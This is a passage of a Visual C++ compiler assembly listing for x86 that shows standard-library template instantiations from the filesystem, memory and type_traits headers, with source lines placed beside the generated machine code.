_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Stringoid_from_Source@$$BY04D@filesystem@std@@YA?A_PAAY04$$CBD@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Source$ = 12						; size = 4
??$_Stringoid_from_Source@$$BY04D@filesystem@std@@YA?A_PAAY04$$CBD@Z PROC ; std::filesystem::_Stringoid_from_Source<char [5]>, COMDAT

; 245  :     _NODISCARD auto _Stringoid_from_Source(const _Src& _Source) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 246  :         using _EcharT = _Iter_value_t<decay_t<_Src>>;
; 247  :         if constexpr (is_pointer_v<_Unwrapped_unverified_t<const _Src&>>) {
; 248  :             return basic_string_view<_EcharT>(_Get_unwrapped_unverified(_Source));

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Source$[ebp]
  00006	50		 push	 eax
  00007	e8 00 00 00 00	 call	 ??$_Get_unwrapped_unverified@AAY04$$CBD@std@@YA?A_TAAY04$$CBD@Z ; std::_Get_unwrapped_unverified<char const (&)[5]>
  0000c	83 c4 04	 add	 esp, 4
  0000f	50		 push	 eax
  00010	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00013	e8 00 00 00 00	 call	 ??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
  00018	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 249  :         } else if constexpr (is_pointer_v<_Unwrapped_t<const _Src&>>) {
; 250  :             const auto _Data = _Get_unwrapped(_Source);
; 251  :             auto _Next       = _Source;
; 252  :             while (*_Next != _EcharT{}) {
; 253  :                 ++_Next;
; 254  :             }
; 255  : 
; 256  :             return basic_string_view<_EcharT>(_Data, static_cast<size_t>(_Get_unwrapped(_Next) - _Data));
; 257  :         } else {
; 258  :             basic_string<_EcharT> _Str;
; 259  :             for (auto _Next = _Source; *_Next != _EcharT{}; ++_Next) {
; 260  :                 _Str.push_back(*_Next);
; 261  :             }
; 262  : 
; 263  :             return _Str;
; 264  :         }
; 265  :     }

  0001b	5d		 pop	 ebp
  0001c	c3		 ret	 0
??$_Stringoid_from_Source@$$BY04D@filesystem@std@@YA?A_PAAY04$$CBD@Z ENDP ; std::filesystem::_Stringoid_from_Source<char [5]>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@DU?$char_traits@D@std@@@1@U_Normal_conversion@01@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Input$ = 12						; size = 8
___formal$ = 20						; size = 1
??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@DU?$char_traits@D@std@@@1@U_Normal_conversion@01@@Z PROC ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>, COMDAT

; 193  :     _NODISCARD wstring _Convert_stringoid_to_wide(const string_view _Input, _Conversion) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 194  :         _STL_INTERNAL_STATIC_ASSERT(_Is_any_of_v<_Conversion, _Normal_conversion, _Utf8_conversion>);
; 195  : 
; 196  :         if constexpr (is_same_v<_Conversion, _Normal_conversion>) {
; 197  :             return _Convert_narrow_to_wide(__std_fs_code_page(), _Input);

  00003	8b 45 10	 mov	 eax, DWORD PTR __Input$[ebp+4]
  00006	50		 push	 eax
  00007	8b 4d 0c	 mov	 ecx, DWORD PTR __Input$[ebp]
  0000a	51		 push	 ecx
  0000b	e8 00 00 00 00	 call	 ___std_fs_code_page@0
  00010	50		 push	 eax
  00011	8b 55 08	 mov	 edx, DWORD PTR ___$ReturnUdt$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?_Convert_narrow_to_wide@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@2@W4__std_code_page@@V?$basic_string_view@DU?$char_traits@D@std@@@2@@Z ; std::filesystem::_Convert_narrow_to_wide
  0001a	83 c4 10	 add	 esp, 16			; 00000010H
  0001d	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 198  :         } else {
; 199  :             return _Convert_narrow_to_wide(__std_code_page::_Utf8, _Input);
; 200  :         }
; 201  :     }

  00020	5d		 pop	 ebp
  00021	c3		 ret	 0
??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@DU?$char_traits@D@std@@@1@U_Normal_conversion@01@@Z ENDP ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Get_unwrapped_unverified@ABQBD@std@@YA?A_TABQBD@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
??$_Get_unwrapped_unverified@ABQBD@std@@YA?A_TABQBD@Z PROC ; std::_Get_unwrapped_unverified<char const * const &>, COMDAT

; 1212 : _NODISCARD constexpr decltype(auto) _Get_unwrapped_unverified(_Iter&& _It) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1213 :     // unwrap an iterator not previously subjected to _Adl_verify_range
; 1214 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1215 :         return _It + 0;

  00003	8b 45 08	 mov	 eax, DWORD PTR __It$[ebp]
  00006	8b 00		 mov	 eax, DWORD PTR [eax]

; 1216 :     } else if constexpr (_Unwrappable_for_unverified_v<_Iter>) {
; 1217 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1218 :     } else {
; 1219 :         return static_cast<_Iter&&>(_It);
; 1220 :     }
; 1221 : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_Get_unwrapped_unverified@ABQBD@std@@YA?A_TABQBD@Z ENDP ; std::_Get_unwrapped_unverified<char const * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Stringoid_from_Source@PBD@filesystem@std@@YA?A_PABQBD@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Source$ = 12						; size = 4
??$_Stringoid_from_Source@PBD@filesystem@std@@YA?A_PABQBD@Z PROC ; std::filesystem::_Stringoid_from_Source<char const *>, COMDAT

; 245  :     _NODISCARD auto _Stringoid_from_Source(const _Src& _Source) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 246  :         using _EcharT = _Iter_value_t<decay_t<_Src>>;
; 247  :         if constexpr (is_pointer_v<_Unwrapped_unverified_t<const _Src&>>) {
; 248  :             return basic_string_view<_EcharT>(_Get_unwrapped_unverified(_Source));

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Source$[ebp]
  00006	50		 push	 eax
  00007	e8 00 00 00 00	 call	 ??$_Get_unwrapped_unverified@ABQBD@std@@YA?A_TABQBD@Z ; std::_Get_unwrapped_unverified<char const * const &>
  0000c	83 c4 04	 add	 esp, 4
  0000f	50		 push	 eax
  00010	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00013	e8 00 00 00 00	 call	 ??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
  00018	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 249  :         } else if constexpr (is_pointer_v<_Unwrapped_t<const _Src&>>) {
; 250  :             const auto _Data = _Get_unwrapped(_Source);
; 251  :             auto _Next       = _Source;
; 252  :             while (*_Next != _EcharT{}) {
; 253  :                 ++_Next;
; 254  :             }
; 255  : 
; 256  :             return basic_string_view<_EcharT>(_Data, static_cast<size_t>(_Get_unwrapped(_Next) - _Data));
; 257  :         } else {
; 258  :             basic_string<_EcharT> _Str;
; 259  :             for (auto _Next = _Source; *_Next != _EcharT{}; ++_Next) {
; 260  :                 _Str.push_back(*_Next);
; 261  :             }
; 262  : 
; 263  :             return _Str;
; 264  :         }
; 265  :     }

  0001b	5d		 pop	 ebp
  0001c	c3		 ret	 0
??$_Stringoid_from_Source@PBD@filesystem@std@@YA?A_PABQBD@Z ENDP ; std::filesystem::_Stringoid_from_Source<char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$_Set_ptr_rep_and_enable_shared@U_Dir_enum_impl@filesystem@std@@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@AAEXQAU_Dir_enum_impl@filesystem@1@QAV_Ref_count_base@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Px$ = 8						; size = 4
__Rx$ = 12						; size = 4
??$_Set_ptr_rep_and_enable_shared@U_Dir_enum_impl@filesystem@std@@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@AAEXQAU_Dir_enum_impl@filesystem@1@QAV_Ref_count_base@1@@Z PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::_Set_ptr_rep_and_enable_shared<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1817 :     void _Set_ptr_rep_and_enable_shared(_Ux* const _Px, _Ref_count_base* const _Rx) noexcept { // take ownership of _Px

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1818 :         this->_Ptr = _Px;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Px$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx

; 1819 :         this->_Rep = _Rx;

  0000f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Rx$[ebp]
  00015	89 42 04	 mov	 DWORD PTR [edx+4], eax

; 1820 :         if constexpr (conjunction_v<negation<is_array<_Ty>>, negation<is_volatile<_Ux>>, _Can_enable_shared<_Ux>>) {
; 1821 :             if (_Px && _Px->_Wptr.expired()) {
; 1822 :                 _Px->_Wptr = shared_ptr<remove_cv_t<_Ux>>(*this, const_cast<remove_cv_t<_Ux>*>(_Px));
; 1823 :             }
; 1824 :         }
; 1825 :     }

  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c2 08 00	 ret	 8
??$_Set_ptr_rep_and_enable_shared@U_Dir_enum_impl@filesystem@std@@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@AAEXQAU_Dir_enum_impl@filesystem@1@QAV_Ref_count_base@1@@Z ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::_Set_ptr_rep_and_enable_shared<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@U_Dir_enum_impl@filesystem@std@@@std@@YAPAU_Dir_enum_impl@filesystem@0@AAU120@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@U_Dir_enum_impl@filesystem@std@@@std@@YAPAU_Dir_enum_impl@filesystem@0@AAU120@@Z PROC ; std::addressof<std::filesystem::_Dir_enum_impl>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@U_Dir_enum_impl@filesystem@std@@@std@@YAPAU_Dir_enum_impl@filesystem@0@AAU120@@Z ENDP ; std::addressof<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$?0U_Creator@_Dir_enum_impl@filesystem@std@@ABW4directory_options@23@@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAU_Creator@_Dir_enum_impl@filesystem@1@ABW4directory_options@41@@Z
_TEXT	SEGMENT
tv129 = -12						; size = 4
tv131 = -8						; size = 4
_this$ = -4						; size = 4
_<_Args_0>$ = 8						; size = 4
_<_Args_1>$ = 12					; size = 4
??$?0U_Creator@_Dir_enum_impl@filesystem@std@@ABW4directory_options@23@@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAU_Creator@_Dir_enum_impl@filesystem@1@ABW4directory_options@41@@Z PROC ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Ref_count_obj2<std::filesystem::_Dir_enum_impl><std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>, COMDAT
; _this$ = ecx

; 2054 :     explicit _Ref_count_obj2(_Types&&... _Args) : _Ref_count_base() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	33 c0		 xor	 eax, eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	89 01		 mov	 DWORD PTR [ecx], eax
  00010	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00013	89 41 08	 mov	 DWORD PTR [ecx+8], eax
  00016	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00019	e8 00 00 00 00	 call	 ??0_Ref_count_base@std@@IAE@XZ ; std::_Ref_count_base::_Ref_count_base
  0001e	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00021	c7 02 00 00 00
	00		 mov	 DWORD PTR [edx], OFFSET ??_7?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@

; 2055 : #if _HAS_CXX20
; 2056 :         if constexpr (sizeof...(_Types) == 1 && (is_same_v<_For_overwrite_tag, remove_cvref_t<_Types>> && ...)) {
; 2057 :             _STD _Default_construct_in_place(_Storage._Value);
; 2058 :             ((void) _Args, ...);
; 2059 :         } else
; 2060 : #endif // _HAS_CXX20
; 2061 :         {
; 2062 :             _STD _Construct_in_place(_Storage._Value, _STD forward<_Types>(_Args)...);

  00027	8b 45 0c	 mov	 eax, DWORD PTR _<_Args_1>$[ebp]
  0002a	50		 push	 eax
  0002b	e8 00 00 00 00	 call	 ??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z ; std::forward<enum std::filesystem::directory_options const &>
  00030	83 c4 04	 add	 esp, 4
  00033	89 45 f8	 mov	 DWORD PTR tv131[ebp], eax
  00036	8b 4d 08	 mov	 ecx, DWORD PTR _<_Args_0>$[ebp]
  00039	51		 push	 ecx
  0003a	e8 00 00 00 00	 call	 ??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ; std::forward<std::filesystem::_Dir_enum_impl::_Creator>
  0003f	83 c4 04	 add	 esp, 4
  00042	89 45 f4	 mov	 DWORD PTR tv129[ebp], eax
  00045	8b 55 f8	 mov	 edx, DWORD PTR tv131[ebp]
  00048	52		 push	 edx
  00049	8b 45 f4	 mov	 eax, DWORD PTR tv129[ebp]
  0004c	50		 push	 eax
  0004d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00050	83 c1 10	 add	 ecx, 16			; 00000010H
  00053	51		 push	 ecx
  00054	e8 00 00 00 00	 call	 ??$_Construct_in_place@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YAXAAU_Dir_enum_impl@filesystem@0@$$QAU_Creator@120@ABW4directory_options@20@@Z ; std::_Construct_in_place<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
  00059	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2063 :         }
; 2064 :     }

  0005c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0005f	8b e5		 mov	 esp, ebp
  00061	5d		 pop	 ebp
  00062	c2 08 00	 ret	 8
??$?0U_Creator@_Dir_enum_impl@filesystem@std@@ABW4directory_options@23@@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAU_Creator@_Dir_enum_impl@filesystem@1@ABW4directory_options@41@@Z ENDP ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Ref_count_obj2<std::filesystem::_Dir_enum_impl><std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z PROC ; std::forward<enum std::filesystem::directory_options const &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z ENDP ; std::forward<enum std::filesystem::directory_options const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z PROC ; std::forward<std::filesystem::_Dir_enum_impl::_Creator>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ENDP ; std::forward<std::filesystem::_Dir_enum_impl::_Creator>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAEPAXI@Z PROC ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAE@XZ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::~_Ref_count_obj2<std::filesystem::_Dir_enum_impl>
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 50		 push	 80			; 00000050H
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAEPAXI@Z ENDP ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Delete_this@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ
_TEXT	SEGMENT
tv76 = -16						; size = 4
tv75 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -4						; size = 4
?_Delete_this@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ PROC ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Delete_this, COMDAT
; _this$ = ecx

; 2083 :     void _Delete_this() noexcept override { // destroy self

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 2084 :         delete this;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR $T1[ebp], eax
  0000f	83 7d fc 00	 cmp	 DWORD PTR $T1[ebp], 0
  00013	74 18		 je	 SHORT $LN3@Delete_thi
  00015	8b 4d fc	 mov	 ecx, DWORD PTR $T1[ebp]
  00018	8b 11		 mov	 edx, DWORD PTR [ecx]
  0001a	8b 42 08	 mov	 eax, DWORD PTR [edx+8]
  0001d	89 45 f4	 mov	 DWORD PTR tv75[ebp], eax
  00020	6a 01		 push	 1
  00022	8b 4d fc	 mov	 ecx, DWORD PTR $T1[ebp]
  00025	ff 55 f4	 call	 DWORD PTR tv75[ebp]
  00028	89 45 f0	 mov	 DWORD PTR tv76[ebp], eax
  0002b	eb 07		 jmp	 SHORT $LN4@Delete_thi
$LN3@Delete_thi:
  0002d	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR tv76[ebp], 0
$LN4@Delete_thi:

; 2085 :     }

  00034	8b e5		 mov	 esp, ebp
  00036	5d		 pop	 ebp
  00037	c3		 ret	 0
?_Delete_this@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ ENDP ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Delete_this
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Destroy@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Destroy@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ PROC ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Destroy, COMDAT
; _this$ = ecx

; 2079 :     void _Destroy() noexcept override { // destroy managed resource

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2080 :         _Destroy_in_place(_Storage._Value);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 10	 add	 eax, 16			; 00000010H
  0000d	50		 push	 eax
  0000e	e8 00 00 00 00	 call	 ??$_Destroy_in_place@U_Dir_enum_impl@filesystem@std@@@std@@YAXAAU_Dir_enum_impl@filesystem@0@@Z ; std::_Destroy_in_place<std::filesystem::_Dir_enum_impl>
  00013	83 c4 04	 add	 esp, 4

; 2081 :     }

  00016	8b e5		 mov	 esp, ebp
  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?_Destroy@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ ENDP ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Destroy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??1?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAE@XZ PROC ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::~_Ref_count_obj2<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 2066 :     ~_Ref_count_obj2() noexcept override { // TRANSITION, should be non-virtual

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@6B@

; 2067 :         // nothing to do, _Storage._Value was already destroyed in _Destroy
; 2068 : 
; 2069 :         // N4950 [class.dtor]/7:
; 2070 :         // "A defaulted destructor for a class X is defined as deleted if:
; 2071 :         // X is a union-like class that has a variant member with a non-trivial destructor"
; 2072 :     }

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ??1_Ref_count_base@std@@UAE@XZ ; std::_Ref_count_base::~_Ref_count_base
  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
??1?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAE@XZ ENDP ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::~_Ref_count_obj2<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@ABV?$allocator@_W@std@@@std@@YAABV?$allocator@_W@0@ABV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@ABV?$allocator@_W@std@@@std@@YAABV?$allocator@_W@0@ABV10@@Z PROC ; std::forward<std::allocator<wchar_t> const &>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@ABV?$allocator@_W@std@@@std@@YAABV?$allocator@_W@0@ABV10@@Z ENDP ; std::forward<std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z
_TEXT	SEGMENT
$T1 = -1						; size = 1
___$ReturnUdt$ = 8					; size = 4
__Input$ = 12						; size = 8
___formal$ = 20						; size = 1
??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z PROC ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>, COMDAT

; 204  :     _NODISCARD wstring _Convert_stringoid_to_wide(const wstring_view _Input, _Conversion) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 205  :         static_assert(
; 206  :             is_same_v<_Conversion, _Normal_conversion>, "invalid value_type, see N4950 [depr.fs.path.factory]/1");
; 207  :         return wstring{_Input};

